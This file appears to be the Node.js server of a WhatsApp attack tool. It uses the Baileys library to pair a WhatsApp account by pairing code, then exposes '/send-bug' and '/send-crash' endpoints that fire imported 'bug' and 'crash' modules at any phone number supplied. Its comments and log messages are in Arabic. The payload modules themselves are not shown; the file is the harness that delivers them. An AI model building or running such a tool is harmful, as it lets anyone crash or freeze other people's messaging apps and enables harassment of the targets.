const express = require("express");
const compression = require("compression");
const {
    default: makeWASocket,
    fetchLatestBaileysVersion,
    DisconnectReason
} = require("@whiskeysockets/baileys");

const bugCommand = require("./commands/bug");
const crashCommand = require("./commands/crash");

const app = express();
app.use(express.json());
app.use(compression());
app.use(express.static("public"));

let sockInstance;
let isPaired = false;

// =====================
// 🚀 تشغيل البوت Pair Code فقط
// =====================
async function initBot() {
    const { version } = await fetchLatestBaileysVersion();

    sockInstance = makeWASocket({
        version,
        printQRInTerminal: false,
        browser: ["ElitePair", "Chrome", "1.0"],
        syncFullHistory: false,
        auth: { creds: {}, keys: {} },
        markOnlineOnConnect: false,
        generateHighQualityLinkPreview: false
    });

    sockInstance.ev.on("connection.update", ({ connection, lastDisconnect }) => {
        if (connection === "open") {
            console.log("✅ تم الاقتران بنجاح!");
            isPaired = true;
        } else if (connection === "close") {
            const reason = lastDisconnect.error?.output?.statusCode;

            if (reason === DisconnectReason.loggedOut) {
                console.log("❌ تسجيل الخروج… إعادة التهيئة");
                isPaired = false;
                initBot();
            } else {
                console.log("🔄 إعادة الاتصال...");
                initBot();
            }
        }
    });

    console.log("⚡ البوت جاهز لطلب رمز Pair Code");
}

initBot();

// =====================
// 🔐 طلب رمز اقتران
// =====================
app.post("/pair", async (req, res) => {
    try {
        const { number } = req.body;

        if (!number) return res.status(400).json({ error: "أدخل رقم الهاتف" });

        if (!sockInstance) return res.status(500).json({ error: "البوت غير جاهز" });

        console.log("📨 طلب رمز لرقم:", number);

        const code = await sockInstance.requestPairingCode(number.trim());

        return res.json({
            status: true,
            number,
            code
        });

    } catch (err) {
        console.error("❌ خطأ في توليد الكود:", err);
        return res.status(500).json({ error: "فشل الحصول على رمز الاقتران" });
    }
});

// =====================
// 🔥 تنفيذ الأوامر بعد الاقتران
// =====================
app.post("/send-bug", async (req, res) => {
    try {
        if (!isPaired) return res.status(400).send("❌ لم يتم الاقتران بعد");
        await bugCommand(sockInstance, req.body.number);
        res.send("🚀 BUG تم إرساله");
    } catch (e) {
        console.error(e);
        res.status(500).send("❌ فشل إرسال BUG");
    }
});

app.post("/send-crash", async (req, res) => {
    try {
        if (!isPaired) return res.status(400).send("❌ لم يتم الاقتران بعد");
        await crashCommand(sockInstance, req.body.number);
        res.send("💥 CRASH تم تنفيذه");
    } catch (e) {
        console.error(e);
        res.status(500).send("❌ فشل تنفيذ CRASH");
    }
});

// =====================
// 🌍 تشغيل السيرفر
// =====================
app.listen(3000, () => {
    console.log("🌐 يعمل على http://localhost:3000");
});
